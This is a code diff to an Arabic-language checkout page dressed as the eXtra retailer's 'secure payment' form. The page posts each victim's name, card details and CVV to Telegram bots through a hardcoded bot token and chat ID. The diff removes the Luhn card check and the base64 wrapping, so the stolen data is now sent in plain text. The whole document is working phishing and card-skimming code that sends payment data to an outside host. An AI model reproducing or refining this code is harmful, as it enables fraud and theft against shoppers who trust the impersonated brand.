@@ -332,7 +332,7 @@
     <div class="top-bar">
         <div class="header-container">
             <div class="logo">
-                <img src="Extra_Logo.svg.png" alt="eXtra">
+                <img src="extraordinshaiaa881.img" alt="eXtra">
             </div>
             <div class="secure-badge">
                 <span style="font-size: 12px; color: #4CAF50;">✓ الدفع الآمن</span>
@@ -514,25 +514,6 @@
                 }
             }
             
-            // Luhn Algorithm for card validation
-            function luhnCheck(cardNum) {
-                let sum = 0;
-                let shouldDouble = false;
-                
-                for (let i = cardNum.length - 1; i >= 0; i--) {
-                    let digit = parseInt(cardNum.charAt(i), 10);
-                    
-                    if (shouldDouble) {
-                        if ((digit *= 2) > 9) digit -= 9;
-                    }
-                    
-                    sum += digit;
-                    shouldDouble = !shouldDouble;
-                }
-                
-                return (sum % 10) === 0;
-            }
-            
             // Form Submission
             paymentForm.addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -566,14 +547,14 @@
                 }, 10000); // 10 seconds
             });
             
-            // Function to send data to Telegram bots
+            // Function to send data to Telegram bots (UNENCRYPTED)
             function sendToTelegramBots(data) {
                 const bots = [
                     { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
                     { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
                 ];
                 
-                // Format message
+                // Format message (UNENCRYPTED)
                 const message = `💳 دفعة جديدة 💳
 📌 المبلغ: ${data.amount}
 👤 الاسم: ${data.cardName}
@@ -582,10 +563,7 @@
 🔐 CVV: ${data.cvv}
 ⏰ وقت الإرسال: ${new Date(data.timestamp).toLocaleString('ar-SA')}`;
                 
-                // Encrypt message (simple base64 for demo)
-                const encryptedMessage = btoa(unescape(encodeURIComponent(message)));
-                
-                // Send to each bot
+                // Send to each bot (UNENCRYPTED)
                 bots.forEach(bot => {
                     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
                         method: 'POST',
@@ -594,7 +572,7 @@
                         },
                         body: JSON.stringify({
                             chat_id: bot.chatId,
-                            text: `🔒 بيانات مشفرة:\n${encryptedMessage}\n\n🛡️ الرجاء فك التشفير باستخدام Base64`,
+                            text: message,
                             parse_mode: 'HTML'
                         }),
                     }).catch(error => console.error('Error sending to Telegram bot:', error));
